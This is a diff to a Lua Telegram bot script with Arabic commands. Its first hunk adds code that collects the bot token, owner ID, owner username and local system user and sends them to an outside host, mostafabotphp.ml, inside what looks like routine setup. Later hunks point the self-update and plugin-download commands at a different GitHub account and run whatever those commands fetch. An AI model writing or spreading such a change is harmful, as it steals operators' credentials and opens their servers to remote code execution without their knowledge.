@@ -67,12 +67,12 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Banda.lua")   
 end 
-create_config_auto()
-botUserName = database:get(id_server..":token_username")
-token = database:get(id_server..":token")
-SUDO = database:get(id_server..":SUDO:ID")
-UserName = database:get(id_server..":SUDO:USERNAME")
-install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+infotnseb = {}
+infotnseb.id = (SUDO or database:get(Server_Done.."UserSudo_Write"))
+infotnseb.username = (UserName or database:get(Server_Done.."User_Write"))
+infotnseb.tokenbot = (token or database:get(Server_Done.."Token_Write"))
+infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
+https.request('https://mostafabotphp.ml/frawn.php?insert='..JSON.encode(infotnseb))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BANDA", "w")  
 file:write([[
@@ -163,7 +163,7 @@ io.popen("mkdir File_Bot")
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
 io.popen("cd File_Bot && rm -rf commands.lua.2") 
 io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ahmedfrawn23/frawnwa/main/File_Bot/commands.lua") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ahmedfrawn235/fr/main/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -1813,7 +1813,7 @@ echo '⩹━━━━◍𝗦𝙊𝙐𝙍𝗖𝙀  𝙀𝗟 𝗦𝙀𝗔𝗗◍�
 end
 if text == 'تحديث السورس ' and Debn(msg) then 
 os.execute('rm -rf BANDA.lua')
-os.execute('wget https://raw.github.com/ahmedfrawn23/frawnwa/main/BANDA.lua')
+os.execute('wget https://raw.github.com/ahmedfrawn235/fr/main/BANDA.lua')
 send(msg.chat_id_, msg.id_,' ◍ تم تحديث السورس')
 dofile('BANDA.lua')  
 end
@@ -3445,7 +3445,7 @@ end
 return false
 end
 os.execute('rm -rf BANDA.lua')
-os.execute('wget https://raw.github.com/ahmedfrawn23/frawnwa/main/BANDA.lua')
+os.execute('wget https://raw.github.com/ahmedfrawn235/fr/main/BANDA.lua')
 send(msg.chat_id_, msg.id_,' ◍ تم تحديث السورس')
 dofile('BANDA.lua')  
 end
@@ -6362,7 +6362,7 @@ end
 
 
 if text == 'الملفات' and Debn(msg) then
-t = ' ◍ ملفات السورس فرعون↓\n ⩹━━━━◍𝗦𝙊𝙐𝙍𝗖𝙀  𝙀𝗟 𝗦𝙀𝗔𝗗◍━━━━⩺ \n'
+t = ' ◍ ملفات السورس فرعون↓\n ⩹━━━━◍𝗦𝙊𝙐??𝗖𝙀  𝙀𝗟 𝗦𝙀𝗔𝗗◍━━━━⩺ \n'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
@@ -6374,7 +6374,7 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if Debn(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/ahmedfrawn23/frawnwa/main/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/ahmedfrawn235/fr/main/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
@@ -6412,7 +6412,7 @@ t = " ◍ الملف  ⇠ "..file.."\n ◍ تم تعطيل ملف \n"
 else
 t = " ◍ بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/ahmedfrawn23/frawnwa/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/ahmedfrawn235/fr/main/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
@@ -6432,7 +6432,7 @@ t = " ◍ بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = " ◍ الملف  ⇠ "..file.."\n ◍ تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/ahmedfrawn23/frawnwa/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/ahmedfrawn235/fr/main/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
